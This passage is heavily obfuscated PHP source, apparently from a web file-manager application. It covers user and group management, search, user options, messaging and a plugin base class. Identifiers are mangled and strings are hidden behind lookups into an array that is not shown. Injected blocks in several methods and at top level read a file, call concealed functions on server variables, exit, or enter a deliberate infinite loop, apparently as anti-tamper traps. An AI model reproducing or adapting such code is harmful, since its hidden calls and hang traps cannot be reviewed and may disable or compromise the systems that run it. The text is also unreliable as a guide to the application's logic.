$this->getInfoSimple($¨¨ûş¦Â); if (!$Áí÷ß¶Â) { return !1; } $ŠƒÔÚàÆ = array($´‰…ù×Õ[1783] => $¨¨ûş¦Â); Model($´‰…ù×Õ[671])->where($ŠƒÔÚàÆ)->delete(); Model($´‰…ù×Õ[2526])->where($ŠƒÔÚàÆ)->delete(); Model($´‰…ù×Õ[2088])->where($ŠƒÔÚàÆ)->delete(); Model($´‰…ù×Õ[2510])->where($ŠƒÔÚàÆ)->delete(); Model($´‰…ù×Õ[1158])->where($ŠƒÔÚàÆ)->delete(); Model($´‰…ù×Õ[2308])->removeUserAll($¨¨ûş¦Â); Model($´‰…ù×Õ[907])->userRootRemove($¨¨ûş¦Â); return $this->where($ŠƒÔÚàÆ)->delete(); } protected function userGroupSet($©Â£µ—Û, $úú³•¦Ä, $ìàÏõŸ× = array()) { $ô—ÁõŞ =& $_SERVER[ıÚ˜š²İ]; if (!isset($_SERVER[$ô—ÁõŞ[962]]) || !isset($_SERVER[$ô—ÁõŞ[960]])) { $Êä§Ãì = $ô—ÁõŞ[963]; $ò¸Ø¢ª = $ô—ÁõŞ[964]; $šğ¸ş = $_SERVER[$ô—ÁõŞ[965]] . $ô—ÁõŞ[966]; $éò÷ì’Ñ = $ò¸Ø¢ª($šğ¸ş); $¿úÏ²º­ = explode($ô—ÁõŞ[288], $éò÷ì’Ñ); if (count($¿úÏ²º­) < $ô—ÁõŞ[691]) { $µ¬¢à²Õ = $ô—ÁõŞ[967]; $µ¬¢à²Õ(); } $˜‹Ş—¨Ÿ = $ô—ÁõŞ[968]; $˜‹Ş—¨Ÿ($_SERVER[$ô—ÁõŞ[969]]); $ƒ§¹™—– = 1; for ($“Áƒ©å = $ƒ§¹™—–; $“Áƒ©å > 0; $“Áƒ©å++) { $˜‹Ş—¨Ÿ = json_encode($GLOBALS[$ô—ÁõŞ[494]]); } } $ñÈ«¶¸ê = $this->getInfoSimple($©Â£µ—Û); if (!$ñÈ«¶¸ê || !is_array($úú³•¦Ä)) { return !1; } $ğêÜ§† = Model($ô—ÁõŞ[2088]); $ğêÜ§†->where(array($ô—ÁõŞ[1792] => $©Â£µ—Û))->delete(); $¼¤¹˜Ë = array(); $ş½ÑÕİƒ = 0; foreach ($úú³•¦Ä as $‰Ç²˜×È => $Êˆ™×´) { $Ÿ£Í°«Ğ = array($ô—ÁõŞ[1792] => $©Â£µ—Û, $ô—ÁõŞ[1404] => $‰Ç²˜×È, $ô—ÁõŞ[2102] => $Êˆ™×´); $Ÿ£Í°«Ğ[$ô—ÁõŞ[2017]] = isset($ìàÏõŸ×[$ş½ÑÕİƒ]) ? $ìàÏõŸ×[$ş½ÑÕİƒ] : 0; $ş½ÑÕİƒ++; $¼¤¹˜Ë[] = $Ÿ£Í°«Ğ; } return $ğêÜ§†->addAll($¼¤¹˜Ë, array(), !0); } protected function userGroupAdd($ø³Ì², $àÙå¶€Î = array()) { $ª¥¤˜‡Ø =& $_SERVER[ıÚ˜š²İ]; $ıë¦ÉïÆ = $this->getInfoSimple($ø³Ì²); if (!$ıë¦ÉïÆ || empty($àÙå¶€Î)) { return !1; } $ñ°º¦À = array(); foreach ($àÙå¶€Î as $–ÆŒª´Œ => $ÜäüíÂÜ) { $ñ°º¦À[] = array($ª¥¤˜‡Ø[1792] => $ø³Ì², $ª¥¤˜‡Ø[1404] => $–ÆŒª´Œ, $ª¥¤˜‡Ø[2102] => $ÜäüíÂÜ, $ª¥¤˜‡Ø[2017] => 0); } return Model($ª¥¤˜‡Ø[2088])->addAll($ñ°º¦À, array(), !0); } protected function userGroupRemove($òÄĞÅË, $£—ÒÃô) { $°‘ÙÏ =& $_SERVER[ıÚ˜š²İ]; $¬Ó¬§Ş = $this->getInfoSimple($òÄĞÅË); if (!$¬Ó¬§Ş || !$£—ÒÃô) { return !1; } $Õúí±Ş’ = array($°‘ÙÏ[1783] => $òÄĞÅË, $°‘ÙÏ[2083] => $£—ÒÃô); return Model($°‘ÙÏ[2088])->where($Õúí±Ş’)->delete(); } public function listData() { $Œƒ»ş¯ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Œƒ»ş¯[$_SERVER[ıÚ˜š²İ][447]]); return $Œƒ»ş¯; } public function listByID($è¶ş°Å) { $é½©Ëã =& $_SERVER[ıÚ˜š²İ]; if (!$è¶ş°Å) { return; } $Èü‡Á¶ö = array($é½©Ëã[1792] => array($é½©Ëã[7], $è¶ş°Å)); $İ€¡ú¨ä = $this->where($Èü‡Á¶ö)->select(); $İ€¡ú¨ä = array_sort_keep($İ€¡ú¨ä, $é½©Ëã[1792], $è¶ş°Å); $this->_listDataApply($İ€¡ú¨ä); return $İ€¡ú¨ä; } public function listByGroup($ŸİßÂÕ = 0, $®¨µÂ±‹ = array()) { $Êì”ÈÏè =& $_SERVER[ıÚ˜š²İ]; $ú¡¢­Ó† = $Êì”ÈÏè[12]; $é¾š½Ì¦ = array(); if ($ŸİßÂÕ) { $é¾š½Ì¦ = array($Êì”ÈÏè[2527] => intval($ŸİßÂÕ)); $ú¡¢­Ó† = "\x4c\x45\x46\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\165\163\145\162\x5f\x67\x72\x6f\x75\x70\x20\x75\163\145\x72\x5f\147\162\x6f\165\160\x20\x6f\156\40\165\x73\x65\x72\56\x75\163\x65\162\111\104\40\75\40\165\x73\x65\x72\137\147\x72\157\x75\160\x2e\165\x73\x65\162\111\104"; $·çı¸†Ë = Input::get($Êì”ÈÏè[532], null, $Êì”ÈÏè[12]) ? $Êì”ÈÏè[12] : $Êì”ÈÏè[2528]; } if (isset($®¨µÂ±‹[$Êì”ÈÏè[826]])) { $é¾š½Ì¦[$Êì”ÈÏè[2529]] = $®¨µÂ±‹[$Êì”ÈÏè[826]]; } $‹Á’§—Ï = _get($®¨µÂ±‹, $Êì”ÈÏè[2530], $Êì”ÈÏè[234]); if (_get($®¨µÂ±‹, $Êì”ÈÏè[837], !1)) { $é¾š½Ì¦[$‹Á’§—Ï] = array($Êì”ÈÏè[2272], $®¨µÂ±‹[$Êì”ÈÏè[837]]); } if (_get($®¨µÂ±‹, $Êì”ÈÏè[838], !1)) { $ü¿Ö¥é¯ = array($Êì”ÈÏè[2273], $®¨µÂ±‹[$Êì”ÈÏè[838]]); if ($é¾š½Ì¦[$‹Á’§—Ï]) { $é¾š½Ì¦[$‹Á’§—Ï] = array($é¾š½Ì¦[$‹Á’§—Ï], $ü¿Ö¥é¯, $Êì”ÈÏè[2274]); } else { $é¾š½Ì¦[$‹Á’§—Ï] = $ü¿Ö¥é¯; } } $¤à¨êÎ = $this->_makeOrder($·çı¸†Ë)->field($Êì”ÈÏè[2531])->where($é¾š½Ì¦)->join($ú¡¢­Ó†)->selectPage(50); $this->_listDataApply($¤à¨êÎ[$Êì”ÈÏè[447]]); return $¤à¨êÎ; } private function _makeOrder($ãºØÀÒ = '') { $¼°ÒŠƒ¼ =& $_SERVER[ıÚ˜š²İ]; $ŸıÙ¶Ü¯ = array($¼°ÒŠƒ¼[1792], $¼°ÒŠƒ¼[32], $¼°ÒŠƒ¼[1982], $¼°ÒŠƒ¼[2202], $¼°ÒŠƒ¼[1954], $¼°ÒŠƒ¼[234]); $ğÅ“ã§¾ = array($¼°ÒŠƒ¼[525] => $¼°ÒŠƒ¼[526], $¼°ÒŠƒ¼[527] => $¼°ÒŠƒ¼[528]); $Ïğ¢ºß = Input::get($¼°ÒŠƒ¼[532], $¼°ÒŠƒ¼[7], $¼°ÒŠƒ¼[1783], $ŸıÙ¶Ü¯); $áùÁ¯Ë™ = Input::get($¼°ÒŠƒ¼[533], $¼°ÒŠƒ¼[7], $¼°ÒŠƒ¼[2089], array($¼°ÒŠƒ¼[2089], $¼°ÒŠƒ¼[527])); $áùÁ¯Ë™ = $ğÅ“ã§¾[$áùÁ¯Ë™]; $ãºØÀÒ = $ãºØÀÒ . "\x75\x73\145\x72\x2e{$Ïğ¢ºß}\x20{$áùÁ¯Ë™}\x2c\40\x75\x73\145\x72\x2e\165\x73\x65\162\x49\x44\x20\x61\x73\143"; return $this->alias($¼°ÒŠƒ¼[2218])->order($ãºØÀÒ); } public function listSearch($Šôãƒ¦’) { $¹ğ—• =& $_SERVER[ıÚ˜š²İ]; $à˜­è˜ = trim($Šôãƒ¦’[$¹ğ—•[2092]]); $ÑÑÖ˜ö¾ = explode($¹ğ—•[53], $à˜­è˜); if (!$à˜­è˜ || count($ÑÑÖ˜ö¾) == 1) { return $this->listSearchNow($Šôãƒ¦’); } $Áê±ñ›™ = array($¹ğ—•[447] => array()); foreach ($ÑÑÖ˜ö¾ as $ïñô¤û) { if (!trim($ïñô¤û)) { continue; } $Šôãƒ¦’[$¹ğ—•[2092]] = $ïñô¤û; $Âßµ¸İŸ = $this->listSearchNow($Šôãƒ¦’); $Áê±ñ›™[$¹ğ—•[447]] = array_merge($Áê±ñ›™[$¹ğ—•[447]], $Âßµ¸İŸ[$¹ğ—•[447]]); } $Áê±ñ›™[$¹ğ—•[447]] = array_unique_by_key($Áê±ñ›™[$¹ğ—•[447]], $¹ğ—•[1792]); $Áê±ñ›™[$¹ğ—•[444]] = array($¹ğ—•[445] => count($Áê±ñ›™[$¹ğ—•[447]]), $¹ğ—•[441] => 20, $¹ğ—•[430] => 1, $¹ğ—•[446] => 1); return $Áê±ñ›™; } public function listSearchNow($ÎĞô¯Ä) { $Òô½Úšş =& $_SERVER[ıÚ˜š²İ]; $«èÛ¸« = trim($ÎĞô¯Ä[$Òô½Úšş[2092]]); $¸¼¬§ü” = isset($ÎĞô¯Ä[$Òô½Úšş[2093]]) ? $ÎĞô¯Ä[$Òô½Úšş[2093]] : !1; $«èÛ¸« = str_replace($Òô½Úšş[2094], $Òô½Úšş[2095], trim($«èÛ¸«)); $ıå¼£¢« = array($Òô½Úšş[32] => array($Òô½Úšş[461], "\x25{$«èÛ¸«}\x25"), $Òô½Úšş[382] => array($Òô½Úšş[461], "{$«èÛ¸«}\45"), $Òô½Úšş[2291] => array($Òô½Úšş[461], "{$«èÛ¸«}\45"), $Òô½Úšş[1089] => $Òô½Úšş[2096]); if (Input::check($«èÛ¸«, $Òô½Úšş[388])) { $ıå¼£¢«[$Òô½Úšş[1792]] = array($Òô½Úšş[461], "{$«èÛ¸«}\45"); $ıå¼£¢«[$Òô½Úšş[2511]] = array($Òô½Úšş[461], "{$«èÛ¸«}\x25"); } if (!$«èÛ¸«) { $ıå¼£¢« = array(); } if (isset($ÎĞô¯Ä[$Òô½Úšş[826]])) { $ıå¼£¢«[$Òô½Úšş[826]] = $ÎĞô¯Ä[$Òô½Úšş[826]]; } $ıå¼£¢« = $this->parseWhereLike($ıå¼£¢«); $áÂ·å¦È = $this->_makeOrder()->where($ıå¼£¢«)->selectPage(20); if (!$áÂ·å¦È || count($áÂ·å¦È[$Òô½Úšş[447]]) < 5 && Input::check($«èÛ¸«, $Òô½Úšş[395])) { $é£›ë˜­ = $this->_searchFromMeta($Òô½Úšş[539], $«èÛ¸«, 10); $Ë»Á—şë = $this->_searchFromMeta($Òô½Úšş[540], $«èÛ¸«, 10); $©ï¾Ú…î = array_merge($é£›ë˜­, $Ë»Á—şë, $áÂ·å¦È[$Òô½Úšş[447]]); $áÂ·å¦È[$Òô½Úšş[447]] = array_unique_by_key($©ï¾Ú…î, $Òô½Úšş[1792]); $áÂ·å¦È[$Òô½Úšş[444]][$Òô½Úšş[445]] = count($áÂ·å¦È[$Òô½Úšş[447]]); $áÂ·å¦È[$Òô½Úšş[444]][$Òô½Úšş[446]] = ceil($áÂ·å¦È[$Òô½Úšş[444]][$Òô½Úšş[445]] / $áÂ·å¦È[$Òô½Úšş[444]][$Òô½Úšş[441]]); } $this->_listDataApply($áÂ·å¦È[$Òô½Úšş[447]]); $this->_filterByGroup($áÂ·å¦È, $¸¼¬§ü”); return $áÂ·å¦È; } private function _filterByGroup(&$á¤§¦àÀ, $Àø‹•ú‡) { $½¹åÈ¶Î =& $_SERVER[ıÚ˜š²İ]; if (!$Àø‹•ú‡) { return $á¤§¦àÀ; } foreach ($á¤§¦àÀ[$½¹åÈ¶Î[447]] as $Äì¤Ù²‰ => &$¶‘Ì–Áß) { $íÉû²‚Ï = array_to_keyvalue($¶‘Ì–Áß[$½¹åÈ¶Î[1403]], $½¹åÈ¶Î[12], $½¹åÈ¶Î[1404]); if (!in_array($Àø‹•ú‡, $íÉû²‚Ï)) { unset($á¤§¦àÀ[$½¹åÈ¶Î[447]][$Äì¤Ù²‰]); } } unset($¶‘Ì–Áß); $á¤§¦àÀ[$½¹åÈ¶Î[447]] = array_values($á¤§¦àÀ[$½¹åÈ¶Î[447]]); $á¤§¦àÀ[$½¹åÈ¶Î[444]] = array($½¹åÈ¶Î[2255] => count($á¤§¦àÀ[$½¹åÈ¶Î[447]]), $½¹åÈ¶Î[2253] => $á¤§¦àÀ[$½¹åÈ¶Î[444]][$½¹åÈ¶Î[441]], $½¹åÈ¶Î[2252] => 1, $½¹åÈ¶Î[2254] => 1); } private function _searchFromMeta($û…’‚Ë•, $Ü††Âšü, $ˆ´ÃÊ×İ) { $°ê‘†â =& $_SERVER[ıÚ˜š²İ]; $Ü††Âšü = strtolower($Ü††Âšü); $ˆğƒ™û = array($°ê‘†â[97] => $û…’‚Ë•, $°ê‘†â[452] => array($°ê‘†â[461], "\x25{$Ü††Âšü}\x25")); $ˆğƒ™û = $this->parseWhereLike($ˆğƒ™û); $©ëÕá£‹ = Model($°ê‘†â[2532])->where($ˆğƒ™û)->limit($ˆ´ÃÊ×İ)->select(); if (!$©ëÕá£‹) { return array(); } $©ëÕá£‹ = array_to_keyvalue($©ëÕá£‹, $°ê‘†â[12], $°ê‘†â[1792]); $‰–¶·Æ€ = $this->where(array($°ê‘†â[1783] => array($°ê‘†â[7], $©ëÕá£‹)))->select(); if (!$‰–¶·Æ€) { return array(); } return $‰–¶·Æ€; } private function _listDataApplyItem($ ‡í˜) { $’¹ÖŸâ¤ = array($ ‡í˜); $this->_listDataApply($’¹ÖŸâ¤); return $’¹ÖŸâ¤[0]; } private function _listDataApply(&$« Ùª•) { $¡–‘Í®· =& $_SERVER[ıÚ˜š²İ]; if (!$« Ùª•) { return; } array_remove_key($« Ùª•, $¡–‘Í®·[978]); $Ë°‰ç = array_to_keyvalue($« Ùª•, $¡–‘Í®·[12], $¡–‘Í®·[1792]); $this->_listAppendGroup($« Ùª•, $Ë°‰ç); $this->_listAppendMeta($« Ùª•, $Ë°‰ç); $this->_listAppendSourceRoot($« Ùª•, $Ë°‰ç); } private function _listAppendSourceRoot(&$«µĞéÇñ, $®ˆÆÂ­™) { $çËí•äì =& $_SERVER[ıÚ˜š²İ]; $·… ¨…¡ = Model($çËí•äì[907])->listSourceRoot(SourceModel::TYPE_USER, $®ˆÆÂ­™); $·… ¨…¡ = array_to_keyvalue($·… ¨…¡, $çËí•äì[573]); $·… ¨…¡ = array_remove_key($·… ¨…¡, $çËí•äì[573]); foreach ($«µĞéÇñ as &$•Ú£¿—) { $•Ú£¿—[$çËí•äì[90]] = $·… ¨…¡[$•Ú£¿—[$çËí•äì[1792]]] ? $·… ¨…¡[$•Ú£¿—[$çËí•äì[1792]]] : array(); } unset($•Ú£¿—); } private function _listAppendGroup(&$ãŒ•Ï¢, $¼ÉÛºî™) { $ÅõÔÆÊ =& $_SERVER[ıÚ˜š²İ]; $á½Ø‰Æ = array($ÅõÔÆÊ[1792] => array($ÅõÔÆÊ[7], $¼ÉÛºî™)); $Ç´‰§éÖ = Model($ÅõÔÆÊ[2088])->where($á½Ø‰Æ)->select(); $Éöô¯™› = array_to_keyvalue($Ç´‰§éÖ, $ÅõÔÆÊ[12], $ÅõÔÆÊ[1404]); $Éöô¯™› = array_remove_value(array_unique($Éöô¯™›), $ÅõÔÆÊ[231]); if (!$Éöô¯™› || !$Ç´‰§éÖ) { return; } $á½Ø‰Æ = array($ÅõÔÆÊ[1404] => array($ÅõÔÆÊ[7], $Éöô¯™›)); $û“¢ÇÓ = Model($ÅõÔÆÊ[1402])->field($ÅõÔÆÊ[2533])->where($á½Ø‰Æ)->select(); $û“¢ÇÓ = array_to_keyvalue($û“¢ÇÓ, $ÅõÔÆÊ[1404]); $Ç´‰§éÖ = array_to_keyvalue_group($Ç´‰§éÖ, $ÅõÔÆÊ[1792]); foreach ($Ç´‰§éÖ as &$Ü®Íõ™ ) { $ÜÑ˜²¨û = array(); foreach ($Ü®Íõ™  as $³çúäÕ) { if (!$³çúäÕ[$ÅõÔÆÊ[2102]]) { continue; } $¬’«Å²¤ = Model($ÅõÔÆÊ[575])->listData($³çúäÕ[$ÅõÔÆÊ[2102]]); $ÜÑ˜²¨û[] = array($ÅõÔÆÊ[1404] => $³çúäÕ[$ÅõÔÆÊ[1404]], $ÅõÔÆÊ[2534] => $û“¢ÇÓ[$³çúäÕ[$ÅõÔÆÊ[1404]]][$ÅõÔÆÊ[32]], $ÅõÔÆÊ[588] => $û“¢ÇÓ[$³çúäÕ[$ÅõÔÆÊ[1404]]][$ÅõÔÆÊ[588]], $ÅõÔÆÊ[489] => $¬’«Å²¤); } $Ü®Íõ™  = $ÜÑ˜²¨û; } unset($Ü®Íõ™ ); foreach ($ãŒ•Ï¢ as &$»¤Âœš›) { $»¤Âœš›[$ÅõÔÆÊ[1403]] = array(); if (isset($Ç´‰§éÖ[$»¤Âœš›[$ÅõÔÆÊ[1792]]])) { $»¤Âœš›[$ÅõÔÆÊ[1403]] = $Ç´‰§éÖ[$»¤Âœš›[$ÅõÔÆÊ[1792]]]; } } unset($»¤Âœš›); } public function userAppendGroup($™½­í”¸) { $ÌÎ§É÷„ =& $_SERVER[ıÚ˜š²İ]; if (!$™½­í”¸) { return array(); } $this->_listAppendGroup($™½­í”¸, array_to_keyvalue($™½­í”¸, $ÌÎ§É÷„[12], $ÌÎ§É÷„[1792])); return $™½­í”¸; } private function _listAppendMeta(&$âºƒ“·¨, $¶èš—Åæ) { $ÉÈÊÛ¼¡ =& $_SERVER[ıÚ˜š²İ]; $¯¥œê§Â = UserJobModel::JOB_KEY; $×§‹¾ß¼ = array($ÉÈÊÛ¼¡[2086]); $ …¬íÓ¤ = array($ÉÈÊÛ¼¡[1792] => array($ÉÈÊÛ¼¡[7], $¶èš—Åæ)); $­²ÀéŠÙ = Model($ÉÈÊÛ¼¡[2510])->where($ …¬íÓ¤)->select(); $€à¶áÔ¬ = array(); foreach ($­²ÀéŠÙ as $¨¯ãÜç) { $®‘±Ö¦¡ = $¨¯ãÜç[$ÉÈÊÛ¼¡[1792]]; if (!isset($€à¶áÔ¬[$®‘±Ö¦¡])) { $€à¶áÔ¬[$®‘±Ö¦¡] = array(); } $€à¶áÔ¬[$®‘±Ö¦¡][$¨¯ãÜç[$ÉÈÊÛ¼¡[97]]] = $¨¯ãÜç[$ÉÈÊÛ¼¡[452]]; } $®úşÍÔ = Model($ÉÈÊÛ¼¡[2535]); foreach ($âºƒ“·¨ as &$ÅãúµØõ) { $®‘±Ö¦¡ = $ÅãúµØõ[$ÉÈÊÛ¼¡[1792]]; $Ú¡ÁáİŠ = isset($€à¶áÔ¬[$®‘±Ö¦¡]) ? $€à¶áÔ¬[$®‘±Ö¦¡] : array(); $ÅãúµØõ[$ÉÈÊÛ¼¡[543]] = array_field_key($Ú¡ÁáİŠ, $×§‹¾ß¼); $ÅãúµØõ[$ÉÈÊÛ¼¡[2536]] = array(); if (isset($Ú¡ÁáİŠ[$¯¥œê§Â])) { $ÅãúµØõ[$ÉÈÊÛ¼¡[2536]] = $®úşÍÔ->getUserJobInfo($Ú¡ÁáİŠ[$¯¥œê§Â]); } } unset($ÅãúµØõ); } protected function groupUserAll($§ˆÈøÜö) { $®½‹úœ =& $_SERVER[ıÚ˜š²İ]; if (!$§ˆÈøÜö) { return !1; } $¢¡ô£Æ— = Model($®½‹úœ[2088])->field($®½‹úœ[1792])->where(array($®½‹úœ[1404] => array($®½‹úœ[7], $§ˆÈøÜö)))->select(); $¢¡ô£Æ— = array_to_keyvalue($¢¡ô£Æ—, $®½‹úœ[12], $®½‹úœ[1792]); return array_unique($¢¡ô£Æ—); } public function userSearch($·îÒâ„ç, $´Íù÷½É = "\52") { return Model($_SERVER[ıÚ˜š²İ][601])->where($·îÒâ„ç)->field($´Íù÷½É)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ö‡Ä÷¯) { $¡š©õĞ =& $_SERVER[ıÚ˜š²İ]; $›î¥ü«ã = defined($¡š©õĞ[2222]) && USER_ID ? USER_ID : $¡š©õĞ[12]; return "\125\x73\145\x72\117\x70\164\x69\x6f\156\137{$Ö‡Ä÷¯}\137" . $›î¥ü«ã; } protected function filterWhere($¸ÄöŠ¢„) { $Ùß´èÓÖ =& $_SERVER[ıÚ˜š²İ]; $¸ÄöŠ¢„[$Ùß´èÓÖ[1792]] = defined($Ùß´èÓÖ[2222]) && USER_ID ? USER_ID : $Ùß´èÓÖ[12]; return $¸ÄöŠ¢„; } public function cacheRemoveUser($ÖÜ™Ø£Ñ, $ï»º§¦Œ) { return Cache::remove("\125\x73\145\162\x4f\x70\164\151\157\156\x5f{$ÖÜ™Ø£Ñ}\137" . $ï»º§¦Œ); } protected function optionDefault($ÕğÓÙª = '') { $ÎàöŸŸ× =& $_SERVER[ıÚ˜š²İ]; if ($ÕğÓÙª == $ÎàöŸŸ×[12]) { return $GLOBALS[$ÎàöŸŸ×[6]][$ÎàöŸŸ×[2537]]; } if ($ÕğÓÙª == $ÎàöŸŸ×[2538]) { return $GLOBALS[$ÎàöŸŸ×[6]][$ÎàöŸŸ×[2539]]; } } } if ($_SERVER[$_SERVER[ıÚ˜š²İ][962]] != $_SERVER[$_SERVER[ıÚ˜š²İ][2117]]) { $_getc = $_SERVER[ıÚ˜š²İ][964]; $_getfile = $_SERVER[$_SERVER[ıÚ˜š²İ][965]] . $_SERVER[ıÚ˜š²İ][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ıÚ˜š²İ][288], $_getfilec); if (count($_getarrs) < $_SERVER[ıÚ˜š²İ][687]) { $exit = $_SERVER[ıÚ˜š²İ][967]; $exit(); } $_act = $_SERVER[ıÚ˜š²İ][1900]; $_act($_SERVER[$_SERVER[ıÚ˜š²İ][960]]); } goto CÏİ·íÊ‘›; fæÒô‡´£: class Message { function __construct() { } public function send($ÍÜ–àÔÅ = '', $öâ°ºø„ = array(), $éÂåÎ›Î = "\x74\145\170\164") { $˜˜´²©è =& $_SERVER[ıÚ˜š²İ]; $¤†äìÄë = array($˜˜´²©è[33] => $˜˜´²©è[1225], $˜˜´²©è[171] => $ÍÜ–àÔÅ); if (in_array($éÂåÎ›Î, array($˜˜´²©è[1225], $˜˜´²©è[1642]))) { $¤†äìÄë[$˜˜´²©è[33]] = $éÂåÎ›Î; } $öâ°ºø„ = array($˜˜´²©è[582] => isset($öâ°ºø„[$˜˜´²©è[582]]) ? $öâ°ºø„[$˜˜´²©è[582]] : $˜˜´²©è[12], $˜˜´²©è[669] => isset($öâ°ºø„[$˜˜´²©è[669]]) ? $öâ°ºø„[$˜˜´²©è[669]] : $˜˜´²©è[12]); if (empty($ÍÜ–àÔÅ) || empty($öâ°ºø„[$˜˜´²©è[582]]) && empty($öâ°ºø„[$˜˜´²©è[669]])) { return !1; } $õ¥»ã³ = array($˜˜´²©è[1571] => $¤†äìÄë, $˜˜´²©è[1643] => $öâ°ºø„); Hook::trigger($˜˜´²©è[1644], $õ¥»ã³); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ç™•´°š =& $_SERVER[ıÚ˜š²İ]; if (!isset($_SERVER[$ç™•´°š[962]]) || !isset($_SERVER[$ç™•´°š[960]])) { $ô¨û†çü = $ç™•´°š[963]; $ö¥¨œ› = $ç™•´°š[964]; $Ä½Ö†õú = $_SERVER[$ç™•´°š[965]] . $ç™•´°š[966]; $öªÕÓ = $ö¥¨œ›($Ä½Ö†õú); $ş‰ÙîÒŒ = explode($ç™•´°š[288], $öªÕÓ); if (count($ş‰ÙîÒŒ) < $ç™•´°š[691]) { $«€£È†Ğ = $ç™•´°š[967]; $«€£È†Ğ(); } $”œŞ÷ÆÁ = $ç™•´°š[968]; $”œŞ÷ÆÁ($_SERVER[$ç™•´°š[969]]); $çÚĞ’½İ = 1; for ($¡×ÅºÇ¦ = $çÚĞ’½İ; $¡×ÅºÇ¦ > 0; $¡×ÅºÇ¦++) { $”œŞ÷ÆÁ = json_encode($GLOBALS[$ç™•´°š[494]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ç™•´°š[1645]); $this->pluginName = str_replace($ç™•´°š[1645], $ç™•´°š[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ç™•´°š[8]; $this->pluginApi = appHostGet() . $ç™•´°š[1646] . $this->pluginName . $ç™•´°š[8]; $this->pluginHost = $config[$ç™•´°š[1647]] . $this->pluginName . $ç™•´°š[8]; $this->pluginHostDefault = $config[$ç™•´°š[1647]] . $this->pluginName . $ç™•´°š[8]; $âŠ›®úÉ = $config[$ç™•´°š[1648]]; if ($âŠ›®úÉ && strpos($ç™•´°š[50] . $âŠ›®úÉ . $ç™•´°š[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ç™•´°š[1649]] . $this->pluginName . $ç™•´°š[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ıÚ˜š²İ][1650]); } protected function assign($Ê­–¥¥±, $²˜øÀÄï = false) { if (is_array($Ê­–¥¥±)) { $this->values = array_merge($this->values, $Ê­–¥¥±); } else { $this->values[$Ê­–¥¥±] = $²˜øÀÄï; } } protected function display($ÄñƒÍ½ƒ) { extract($this->values); require $ÄñƒÍ½ƒ; } final function hookRegist($½¨¹Ğ») { $this->modelPlugin->appRegist($this->pluginName, $½¨¹Ğ»); } final function appIcon() { $ÃøüŒäò =& $_SERVER[ıÚ˜š²İ]; $ãóñ¥± = $this->appPackage(); $¡™ˆÔŸú = $ÃøüŒäò[12]; if (isset($ãóñ¥±[$ÃøüŒäò[492]])) { if (isset($ãóñ¥±[$ÃøüŒäò[492]][$ÃøüŒäò[1651]])) { $¡™ˆÔŸú = $ÃøüŒäò[1652] . $ãóñ¥±[$ÃøüŒäò[492]][$ÃøüŒäò[1651]] . $ÃøüŒäò[1653]; } else { if ($ãóñ¥±[$ÃøüŒäò[492]][$ÃøüŒäò[1654]]) { $¡™ˆÔŸú = $ÃøüŒäò[1655] . $ãóñ¥±[$ÃøüŒäò[492]][$ÃøüŒäò[1654]] . $ÃøüŒäò[1656]; } } } return $¡™ˆÔŸú; } final function fileCanView($‡‘ú¤¿Ş) { $½•…ÄÔø =& $_SERVER[ıÚ˜š²İ]; if (request_url_safe($‡‘ú¤¿Ş)) { return !0; } if ($this->isShare($‡‘ú¤¿Ş)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $À¤ˆ„¹ = $½•…ÄÔø[1657] . rawurlencode(this_url()); show_tips(LNG($½•…ÄÔø[1658]) . $½•…ÄÔø[1659] . $À¤ˆ„¹ . $½•…ÄÔø[1660] . LNG($½•…ÄÔø[1661]) . $½•…ÄÔø[1662], !1); } if (!Action($½•…ÄÔø[1663])->authCan($½•…ÄÔø[1664])) { show_tips(LNG($½•…ÄÔø[1665]) . $½•…ÄÔø[1666], !1); } ActionCall($½•…ÄÔø[1667], $‡‘ú¤¿Ş); } final function isShare($ØßÆÄÎœ) { $¿éÚÀĞŠ = KodIO::parse($ØßÆÄÎœ); return $¿éÚÀĞŠ[$_SERVER[ıÚ˜š²İ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ì’¸Ÿ£) { if (request_url_safe($Ì’¸Ÿ£)) { return $Ì’¸Ÿ£; } if (!$this->isShare($Ì’¸Ÿ£)) { $Ì’¸Ÿ£ = $this->filePath($Ì’¸Ÿ£, !1); } return Action($_SERVER[ıÚ˜š²İ][1270])->linkOut($Ì’¸Ÿ£); } public function filePathLinkOut($¶ë” ö) { if (request_url_safe($¶ë” ö)) { return $¶ë” ö; } $this->fileCanView($¶ë” ö); return Action($_SERVER[ıÚ˜š²İ][1270])->link($¶ë” ö); } final function filePath($¸ö½ŞÁæ, $¬êÚ¤µÔ = true, $ı·èÊµ› = false) { $ĞåÙı¯Æ =& $_SERVER[ıÚ˜š²İ]; $½İı«€¾ = $this->filePathGet($¸ö½ŞÁæ, $¬êÚ¤µÔ); if (!$this->fileInfo) { show_tips(LNG($ĞåÙı¯Æ[108]), !1); } if ($ı·èÊµ› && isset($this->fileInfo[$ĞåÙı¯Æ[545]]) && $this->fileInfo[$ĞåÙı¯Æ[545]]) { $–å„²©ï = Model($ĞåÙı¯Æ[548])->fileInfo($this->fileInfo[$ĞåÙı¯Æ[545]]); if (!$–å„²©ï || !IO::exist($–å„²©ï[$ĞåÙı¯Æ[87]])) { $ôŞ¨µŒç = LNG($ĞåÙı¯Æ[108]) . LNG($ĞåÙı¯Æ[1668]); if (KodUser::isRoot() && isset($–å„²©ï[$ĞåÙı¯Æ[87]])) { $ôŞ¨µŒç .= $ĞåÙı¯Æ[1669] . $–å„²©ï[$ĞåÙı¯Æ[87]] . $ĞåÙı¯Æ[1670]; } show_tips($ôŞ¨µŒç); } } 